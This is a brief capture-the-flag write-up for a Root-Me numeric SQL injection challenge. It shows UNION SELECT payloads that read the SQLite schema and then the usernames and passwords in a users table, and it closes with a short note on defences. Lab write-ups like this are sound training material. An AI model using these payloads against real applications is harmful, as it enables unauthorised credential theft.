# SQL injection: numeric

[root-me challenge: SQL-injection-Numeric](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-Numeric): Retrieve the administrator password.

----

```text
news_id=1' UNION SELECT NULL --
```

```text
SQLite3::query()
```

Using [PayloadAllTheThings: SQLiteInjection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md):

```text
news_id=1 UNION SELECT NULL,sql,NULL FROM sqlite_master --
```

```text
news_id=1 UNION SELECT NULL,username,password FROM users --
```

## Counter moves

SQL injection: numeric is the variant in play. Server-side validation and least privilege are what these reduce to. Seen from the other side, this sits in the blue notes on [the application layer as a target](https://blue.tymyrddin.dev/docs/counter/app/).
